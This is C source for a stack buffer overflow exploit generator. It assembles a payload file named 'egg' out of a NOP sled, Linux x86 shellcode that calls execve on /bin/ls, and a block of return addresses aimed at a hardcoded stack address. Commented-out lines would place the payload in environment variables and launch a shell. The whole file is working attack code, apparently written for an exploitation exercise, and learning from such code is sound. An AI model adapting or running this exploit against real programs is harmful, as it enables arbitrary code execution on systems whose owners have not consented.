#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#define SHELLSZ 45
#define NOP 0x90
#define OFFSZ 0
#define ADDSZ 64
#define ADJ 0
#define SLIDESZ 2000

char mkshell[] = 
            "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
            "\x80\xe8\xdc\xff\xff\xff/bin/ls";

//unsigned long *get_sp(void){
//		__asm__("movl  %esp, %eax");
//}

int main(int argc, char *argv[]){
		char *buf, *ptr, *yoke;
		unsigned long **addp, *addr;
		unsigned long nopsz, shellsz, addsz, adj, offset;
		int i;
    int fd;
		offset = (unsigned long)OFFSZ;
		nopsz = (unsigned long)SLIDESZ;
		addsz = (unsigned long)ADDSZ;
		adj = (unsigned long)ADJ;

		if(argc < 3 || argc > 5){
				fprintf(stderr,"Usage: %s <nop slide length> <address block length> [offset [address adjustment]]\n", argv[0]);
				exit(-1);
		}
		//addr = (unsigned long *)0xc0000000;
		addr = (unsigned long *)0xbffdf000;
		errno = 0;
		nopsz = strtol(argv[1], NULL, 0);
		addsz = strtol(argv[2], NULL, 0);
		if(argc > 3){
				offset = strtol(argv[3], NULL, 0);
		}
		if(argc > 4){
				adj = strtol(argv[4], NULL, 0);
		}
		if(errno != 0){
				fprintf(stderr, "Usage: %s <nop slide length> <address block length> [offset [address adjustment]]\n", argv[0]);
				fprintf(stderr, "        Error: Non-decimal argument\n");
				exit(-1);
		}

		shellsz = (unsigned long)SHELLSZ;
		//addr = (unsigned long *)0xc0000000;
		addr = (unsigned long *)0xbffdf000;
		addr = (unsigned long *)((unsigned long)addr + offset);

		printf("  RET Structure\n");
		printf("  Number of Addresses in Address Block  %lu\n", addsz);
		printf("  Adjustment                            %lu\n", adj);
		printf("  Address Data\n");
		printf("  Offset                                %lu\n", offset);
		printf("  Stack Address                         %p\n", (void*)addr);
		printf("  Total RET size (adds + adj + 5)       %lu\n", 4*addsz+adj+5);
		printf("  EGG  (Yoke) Structure\n");
		printf("  NOP slide Size                        %lu\n", nopsz);
		printf("  Shell Code Size                       %lu\n", shellsz);

		if(!(buf = malloc(4*addsz + adj + 5))){
				printf("malloc failure\n");
				exit(0);
		}
		//memcpy(buf,"RET=",4);
		if(!(yoke = malloc(nopsz + shellsz + 1))){
				printf("malloc failure\n");
				exit(0);
		}

		printf("Using address: %p\n", (char *)addr);

		//ptr = buf + 4;
    ptr = buf;
		for( i = 0; i < adj; i++){
				*(ptr++) = NOP;
		}

		addp = (unsigned long **)ptr;
		for(i = 0; i < addsz; i++){
				*(addp++) = addr;
		}
		ptr = yoke;
		for(i = 0; i < nopsz; i++){
				*(ptr++) = NOP;
		}
		for(i = 0; i < shellsz; i++){
				*(ptr++) = mkshell[i];
		}

		//buf[4*addsz + 4 + adj] = '\0';
		yoke[nopsz + shellsz] = '\n';
 	  if((fd = open("egg", O_WRONLY|O_CREAT| O_TRUNC, 0600)) < 0){
      perror("egg");
      exit(-1);
	  }
    write(fd,buf,4*addsz+adj+5);
    write(fd,yoke,nopsz+shellsz+1);
		//memcpy(yoke, "EGG=", 4);
		//putenv(yoke);
		//putenv(buf);
		//system("/bin/dash");
		return(0);
}
